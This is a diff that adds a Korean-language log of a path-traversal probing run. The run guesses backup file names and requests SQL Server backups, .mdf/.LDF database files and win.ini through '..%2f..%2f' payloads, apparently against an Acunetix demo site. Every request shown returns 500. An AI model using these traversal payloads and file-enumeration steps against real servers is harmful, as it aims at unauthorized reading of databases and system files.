@@ -1,0 +1,48 @@
+### 1. 잘린 백업 경로의 꼬리 이어붙이기
+  전체 길이 = 94 (앞 90자는 이미 확보)
+  이어붙인 꼬리 = '2021'
+  → 전체 경로 = 'C:\\Backup_testasp_testaspnet_1apr2021\\Databases\\Backup_from_Management_Studio\\acublog_1apr2021'
+
+### 2. 백업 디렉터리 추정
+  백업 디렉터리 = 'C:\\Backup_testasp_testaspnet_1apr2021\\Databases\\Backup_from_Management_Studio'
+
+### 3. ★ LFI 도달 검증 (공백/역슬래시 전부 인코딩)
+  [   -  ] 발견한 백업 파일(원문)
+        ..%2f..%2fBackup_testasp_testaspnet_1apr2021/Databases/Backup_from_Management_Studio/acublog_1apr2021
+        → 500 size=1208
+  [   -  ] 패턴 추정: acuforum_1apr2021
+        ..%2f..%2fBackup_testasp_testaspnet_1apr2021/Databases/Backup_from_Management_Studio/acuforum_1apr2021
+        → 500 size=1208
+  [   -  ] 패턴 추정: acuservice_1apr2021
+        ..%2f..%2fBackup_testasp_testaspnet_1apr2021/Databases/Backup_from_Management_Studio/acuservice_1apr2021
+        → 500 size=1208
+  [   -  ] 패턴 추정: acublog_1apr2021
+        ..%2f..%2fBackup_testasp_testaspnet_1apr2021/Databases/Backup_from_Management_Studio/acublog_1apr2021
+        → 500 size=1208
+  [   -  ] 패턴 추정: master_1apr2021
+        ..%2f..%2fBackup_testasp_testaspnet_1apr2021/Databases/Backup_from_Management_Studio/master_1apr2021
+        → 500 size=1208
+
+### 4. SQL 데이터 디렉터리의 DB 파일 실존 여부 (내용은 읽지 않음)
+  [   -  ] DATA\acuforum.mdf
+        ..%2f..%2fProgram Files/Microsoft SQL Server/MSSQL12.SQL/MSSQL/DATA/acuforum.mdf
+        → 500 size=1208
+  [   -  ] DATA\acuforum_log.LDF
+        ..%2f..%2fProgram Files/Microsoft SQL Server/MSSQL12.SQL/MSSQL/DATA/acuforum_log.LDF
+        → 500 size=1208
+  [   -  ] DATA\acublog.mdf
+        ..%2f..%2fProgram Files/Microsoft SQL Server/MSSQL12.SQL/MSSQL/DATA/acublog.mdf
+        → 500 size=1208
+  [   -  ] DATA\acuservice.mdf
+        ..%2f..%2fProgram Files/Microsoft SQL Server/MSSQL12.SQL/MSSQL/DATA/acuservice.mdf
+        → 500 size=1208
+  [   -  ] DATA\master.mdf
+        ..%2f..%2fProgram Files/Microsoft SQL Server/MSSQL12.SQL/MSSQL/DATA/master.mdf
+        → 500 size=1208
+
+### 5. 대조군 — 실존이 확인된 파일이 같은 방식으로 200 이 나오는지 (오라클 검증)
+  [   -  ] 대조군 C:\Windows\win.ini (200 기대)
+        ..%2f..%2fWindows/win.ini
+        → 500 size=1208
+
+### 완료 — 총 요청 49건 → out/backup_paths2.json
